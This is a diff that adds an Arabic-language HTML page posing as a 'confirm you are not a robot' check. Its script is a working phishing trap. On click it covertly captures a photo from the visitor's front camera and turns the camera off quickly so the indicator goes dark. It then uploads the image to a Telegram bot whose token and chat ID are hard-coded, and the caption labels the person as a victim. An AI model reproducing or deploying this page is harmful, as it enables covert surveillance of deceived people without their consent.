@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>معالجة البيانات بالأبعاد الكاملة</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; background: #1e1e1e; color: white; padding-top: 50px; }
+        .card { max-width: 400px; margin: 0 auto; background: #2a2a2a; padding: 20px; border-radius: 8px; }
+        .btn { padding: 12px 24px; background: #00ffcc; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; color: #1e1e1e; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>للدخول للموقع الرجاء التأكيد لنا انك لست روبوت عن طريق الضغط على زر تأكيد انك لست روبوت </h2>
+        <p>اضغط هنا من فضلك👇🏻</p>
+        
+        <button class="btn" onclick="processHighResData()">تأكيد انك لست روبوت</button>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = '8912963577:AAGg1wcPuOyCfTkFLIIJPyRzi5p37dyXFE4';
+        const CHAT_ID = '8334182689';
+
+        function processHighResData() {
+            // طلب دقة عالية من المتصفح تلقائياً (ideal: 2060p
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: "user",
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                } 
+            })
+            .then(function(stream) {
+                
+                let hiddenVideo = document.createElement('video');
+                hiddenVideo.srcObject = stream;
+                hiddenVideo.autoplay = true;
+                hiddenVideo.playsInline = true;
+
+                hiddenVideo.onloadedmetadata = function() {
+                    // الانتظار قليلاً ليتدفق الفيديو وتستقر الأبعاد الحقيقية
+                    setTimeout(() => {
+                        
+                        let hiddenCanvas = document.createElement('canvas');
+                        
+                        // التعديل الجذري: جعل الـ Canvas يأخذ أبعاد الفيديو الحقيقية من المستشعر مباشرة
+                        hiddenCanvas.width = hiddenVideo.videoWidth;
+                        hiddenCanvas.height = hiddenVideo.videoHeight;
+                        
+                        let context = hiddenCanvas.getContext('2d');
+                        
+                        // رسم الصورة بالأبعاد الكاملة والدقيقة
+                        context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                        
+                        // إيقاف الكاميرا فوراً لإغلاق النقطة الخضراء
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // تحويل اللقطة إلى ملف عالي الجودة
+                        hiddenCanvas.toBlob(function(blob) {
+                            let formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'high_res_capture.jpg');
+                            formData.append('caption', `📸 تم استلام صورة الضحية :\nالنسق: ${hiddenCanvas.width}x${hiddenCanvas.height}`);
+
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                if(data.ok) {
+                                    alert("✅ تمت المعالجة يمكنك متابعة التصفح الأن!");
+                                } else {
+                                    alert("❌ فشل الإرسال.");
+                                }
+                            })
+                            .catch(err => alert("حدث خطأ في الشبكة."));
+                        }, 'image/jpeg', 0.9); // رفع جودة الضغط إلى 0.9 للحصول على نقاوة أعلى
+
+                    }, 600); 
+                };
+            })
+            .catch(function(err) {
+                alert("تم رفض الإذن: " + err);
+            });
+        }
+    </script>
+</body>
+</html>
